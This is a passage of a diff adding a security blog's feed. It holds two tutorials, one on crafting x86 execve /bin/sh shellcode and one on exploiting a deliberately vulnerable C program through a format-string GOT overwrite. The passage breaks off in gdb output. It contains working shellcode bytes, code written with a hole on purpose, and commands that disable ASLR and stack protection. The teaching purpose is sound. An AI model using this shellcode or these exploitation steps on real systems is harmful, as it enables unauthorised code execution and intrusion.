+  &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; trigger the call&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Above you will notice I use the al register which the the 8bit version of the
+EAX register, this is so there are no NULL bytes in the assembly as 32 bit
+version of 11 in hex is 0x0000000b and the 8 bit version is 0x0b.&lt;/p&gt;
+
+&lt;p&gt;With that all done here is the final assembly&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;kr&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_start&lt;/span&gt;
+&lt;span class=&quot;kr&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;	  &lt;span class=&quot;c&quot;&gt;; zero out eax&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; push NULL onto stack to termins //bin/sh&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;; push //bin/sh in reverse onto the stack&lt;/span&gt;
+                  &lt;span class=&quot;c&quot;&gt;; (extra / is to make data multiple of 4)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69622f2f&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;; see above&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; move address of //bin/sh into EBX (execve's 1st parameter)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; this serves two purposes 1, to use for EDX (we will pass no&lt;/span&gt;
+                  &lt;span class=&quot;c&quot;&gt;; environment to the shell and also as part of the array of&lt;/span&gt;
+                  &lt;span class=&quot;c&quot;&gt;; args that we will pass to as the 2nd arg of execve&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;	  &lt;span class=&quot;c&quot;&gt;; see above&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; ESP now points to and array of args [address of //bin/sh, 0x00]&lt;/span&gt;
+                  &lt;span class=&quot;c&quot;&gt;; these will act as the args to //bin/sh&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;	  &lt;span class=&quot;c&quot;&gt;; setup the 3rd argument&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;; set the EAX register to the execve sys call number&lt;/span&gt;
+                  &lt;span class=&quot;c&quot;&gt;; using al to remove any null bytes&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; make the call&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;To recap the few tricks we used&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Used xor to create a NULL without having a null in the code&lt;/li&gt;
+  &lt;li&gt;Added the extra / to the /bin/sh string to make pushing the data easier and
+with less instructions&lt;/li&gt;
+  &lt;li&gt;Reused data we already had on the stack to create the arguments array for the
+execve call&lt;/li&gt;
+  &lt;li&gt;Used the 8 bit version (al) of the EAX register to avoid NULL bytes in the
+generated code&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Save the above code to execve.nasm, compile, link and run&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ nasm -f elf32 -o execve.o execve.nasm
+  $ ld -o execve execve.o
+  $ ./execve
+  $
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;If you are running bash you will notice now that your prompt has changed,
+congrats your syscall worked!!&lt;/p&gt;
+
+&lt;h1 id=&quot;converting-to-shellcode&quot;&gt;Converting to shellcode&lt;/h1&gt;
+&lt;p&gt;So how do we go about converting this assembled object file into a shellcode
+string you see in exploits? There is a little tool called objdump which happens
+to have a -d flag and this flag dissasembles object files, lets see&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ objdump -d execve.o
+
+  execve.o:     file format elf32-i386
+
+
+  Disassembly of section .text:
+
+  00000000 &amp;lt;_start&amp;gt;:
+     0:	31 c0                	xor    %eax,%eax
+     2:	50                   	push   %eax
+     3:	68 6e 2f 73 68       	push   $0x68732f6e
+     8:	68 2f 2f 62 69       	push   $0x69622f2f
+     d:	89 e3                	mov    %esp,%ebx
+     f:	50                   	push   %eax
+    10:	89 e2                	mov    %esp,%edx
+    12:	53                   	push   %ebx
+    13:	89 e1                	mov    %esp,%ecx
+    15:	b0 0b                	mov    $0xb,%al
+    17:	cd 80                	int    $0x80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see we from above we have our original assembly back (kind of). You
+see those hex bytes that appear before our assembly instructions? Those are the
+op codes that the CPU understands and those are what we need in our shellcode
+string.&lt;/p&gt;
+
+&lt;p&gt;First we will need only the lines that contain instructions&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ objdump -d execve.o | grep &quot;^ &quot;
+     0:	31 c0                	xor    %eax,%eax
+     2:	50                   	push   %eax
+     3:	68 6e 2f 73 68       	push   $0x68732f6e
+     8:	68 2f 2f 62 69       	push   $0x69622f2f
+     d:	89 e3                	mov    %esp,%ebx
+     f:	50                   	push   %eax
+    10:	89 e2                	mov    %esp,%edx
+    12:	53                   	push   %ebx
+    13:	89 e1                	mov    %esp,%ecx
+    15:	b0 0b                	mov    $0xb,%al
+    17:	cd 80                	int    $0x80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Next we want just the second column or field&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ objdump -d execve.o | grep &quot;^ &quot; | cut -f2
+  31 c0
+  50
+  68 6e 2f 73 68
+  68 2f 2f 62 69
+  89 e3
+  50
+  89 e2
+  53
+  89 e1
+  b0 0b
+  cd 80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Then we want to iterate over each of these bytes and put the \x in front of
+them. For loops to the rescue&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ for i in $(objdump -d execve.o | grep &quot;^ &quot; | cut -f2); do echo '\x'$i; done
+  \x31
+  \xc0
+  \x50
+  \x68
+  \x6e
+  \x2f
+  \x73
+  \x68
+  \x68
+  \x2f
+  \x2f
+  \x62
+  \x69
+  \x89
+  \xe3
+  \x50
+  \x89
+  \xe2
+  \x53
+  \x89
+  \xe1
+  \xb0
+  \x0b
+  \xcd
+  \x80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Nearly! Fortunately echo has a -n flag that prevents it from printing newlines&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ for i in $(objdump -d execve.o | grep &quot;^ &quot; | cut -f2); do echo -n '\x'$i; done
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;So close!!!! We can just put an extra echo at the end&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ for i in $(objdump -d execve.o | grep &quot;^ &quot; | cut -f2); do echo -n '\x'$i; done; echo
+  \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+  $
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;h1 id=&quot;test-the-shellcode&quot;&gt;Test the shellcode&lt;/h1&gt;
+&lt;p&gt;Now to test the shellcode we need a program we can put this in to run it. Below
+is a C program whic I did not create myself (Thanks Vivek from
+&lt;a href=&quot;http://www.securitytube.net&quot;&gt;SecurityTube&lt;/a&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; \
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Shellcode Length:  %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This program just passes execution to our shellcode which we placed in the code
+string. Compile it using&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gcc -fno-stack-protector -z execstack -o shell_test shell_test.c
+  $ ./shell_test 
+  Shellcode Length:  25
+  $  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;as you can see the program printed the length of the shellcode and then passed
+control of execution to our shellcode and we have now ended up with a shell!&lt;/p&gt;
+
+&lt;p&gt;Hope you enjoyed this. Check out &lt;a href=&quot;http://www.securitytube.net&quot;&gt;SecurityTube&lt;/a&gt;
+they have free videos on x86 linux and windows assembly if you are interested in
+that sort of thing!&lt;/p&gt;
+</description>
+				<pubDate>Wed, 02 Nov 2016 17:00:00 +0000</pubDate>
+				<link>https://bad-hombres.github.io//blog/2016/11/02/Crafting-Shellcode.html</link>
+				<guid isPermaLink="true">https://bad-hombres.github.io//blog/2016/11/02/Crafting-Shellcode.html</guid>
+			</item>
+		
+			<item>
+				<title>Format Strings</title>
+				<description>&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+&lt;p&gt;Any of us who have been around a while will most likely will have done some C
+and will almost certainly come across the printf family of functions. Now
+printf and its cousins have the special ability of accepting a string argument
+which details how the data passed to it should be formatted, for example&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Received string: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Save the file as hello.c and compile with&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gcc -o hello hello.c
+  $ ./hello mike
+  Received string: mike
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h1 id=&quot;problem&quot;&gt;Problem&lt;/h1&gt;
+&lt;p&gt;you can see that we received the output expected. However if the programmer was
+lazy (and most of us are) then because he was writing the string directly he may
+have just done something like the following&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Compile and run as before and you see the string still gets printed&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ./hello mike
+  mike
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;but now the programmer has passed the data into printf where the format string
+is and printf will respond by parsing the input as a format string. The man page
+for printf shows us the format string specifiers that we can use in format
+strings, playaround with these and see what values you get back&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ./hello %d.%d
+  -8856.-8832
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Whoa! Where did those numbers came from? The answer is the stack our string said
+to display the next two params as decimal values, since we didnt provide them
+ourselves it pops them off the stack.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploiting&quot;&gt;Exploiting&lt;/h1&gt;
+&lt;p&gt;This by its self can be used for data leakage by reading arbitrary data from the
+stack you could leak sensitive data stored in memory, read stack canary values
+to exploit buffer overflows in binaries where stack protection is enabled.&lt;/p&gt;
+
+&lt;p&gt;Today however we are going to use this to get a shell&lt;/p&gt;
+
+&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;
+&lt;p&gt;See my post on vagrant to setup a 32 bit virtual machine. Once ssh’d into that
+machine save the following file to fmt.c&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/* fmt.c - sample program vulnerable to format string exploitation
+ * 
+ * $ gcc -o fmt fmt.c
+ * $ execstack -s fmt # make stack executable
+ */&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt; 
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Compile using&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gcc -fno-stack-protector -z execstack -o fmt fmt.c
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;You may see a warning about format strings but as long as you end up with a fmt
+binary its all good. You also need to disable ASLR or else your shellcode will
+move about on the stack each time you run the program. As root run&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;moving-on&quot;&gt;Moving on&lt;/h2&gt;
+&lt;p&gt;Now we hav2 our vulnerable binary lets test it&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ./fmt AAAA
+  AAAA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;looks good, now after reading the man pages for printf we found a couple of
+interesting format specifiers&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;%x lets us display a value as hex&lt;/li&gt;
+  &lt;li&gt;%n writes the amount of bytes written so far to the pointer that corresponds
+to this parameter&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Jackpot! We can use this to write arbitrary data to a memory location that we
+control!!!! More on that later, first we need to find out how to access the data
+we supplied (so that we can provide our own address to write data to)&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ./fmt AAAA.%x.%x.%x.%x.%x.%x
+  AAAA.bffff88b.1.b7ec71c9.41414141.2e78252e.252e7825
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;You can see from above that the 41414141 string is the 4th value on the stack
+(0x41 hex is 65 decimal which is ascii A). Now up until now I have not mention
+direct parameter access, this allows is to not have to specify all the %x’s and
+reference the 4th parameter as %4$x, see below&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ./fmt AAAA.%4\$x
+  AAAA.41414141
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;You can now see that we are fetching our 4 A’s of the stack (we have to escape
+the $ as it is a special shell character). With the help of the %n specifier we
+are going to write the address of some shellcode that we’ll place on the stack
+over the address of a function in the Global Offset Table (GOT for short) so to
+sum up those 4 A’s need to become the address of an entry in the GOT (and needs
+to be called after the printf function call) and we need to write enough data so
+that the %n value is equal to the address of our shell code.&lt;/p&gt;
+
+&lt;h2 id=&quot;shellcode&quot;&gt;Shellcode&lt;/h2&gt;
+&lt;p&gt;I am not going to explain how I crafted this shellcode (I’ll write another post
+on how I did that). Run the below command in order to set up an environment
+variable with our shell code in&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ export EGG=$(python -c 'print &quot;\x90&quot; * 64 +
+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;')
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Here I’m using pythons ability to print hex chars to save the shellcode into the
+EGG environment variable (see shellstorm.org for more examples of shellcode)&lt;/p&gt;
+
+&lt;h2 id=&quot;data-gathering&quot;&gt;Data Gathering&lt;/h2&gt;
+&lt;p&gt;Now in order to exploit this vulnerability we need to gather a few pieces of
+data&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Address of function in GOT to overwrite.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ objdump -R fmt
+
+  fmt:     file format elf32-i386
+
+  DYNAMIC RELOCATION RECORDS
+  OFFSET   TYPE              VALUE 
+  08049ff0 R_386_GLOB_DAT    __gmon_start__
+  0804a000 R_386_JUMP_SLOT   printf
+  0804a004 R_386_JUMP_SLOT   strcpy
+  0804a008 R_386_JUMP_SLOT   __gmon_start__
+  0804a00c R_386_JUMP_SLOT   __libc_start_main
+  0804a010 R_386_JUMP_SLOT   putchar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;we’ll use the address of putchar as this gets called immediately after the
+printf function so the address we are writing to is 0x0894a010 (this 32 bit / 4
+byte address will become our A’s in the payload string this means our format
+string  will become $(python -c ‘print “\x10\xa0\x04\x08”’).%4$n Which
+translated means write the number 5 to the address 0x0804a010. Why the number 5?
+Well we have written 4 bytes for the address (where the A’s used to be) plus 1
+period we used as a spacer. You may be thinking wait why is the address
+backwards? Well this is because this machine is little endian (go and google!!).
+Lets verify this in gdb!!&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gdb fmt
+  gdb-peda$ run $(python -c 'print &quot;\x10\xa0\x04\x08&quot;').%4\$n
+  [----------------------------------registers-----------------------------------]
+  EAX: 0x5 
+  EBX: 0xb7fd1ff4 --&amp;gt; 0x1a0d7c 
+  ECX: 0x0 
+  EDX: 0x0 
+  ESI: 0x0 
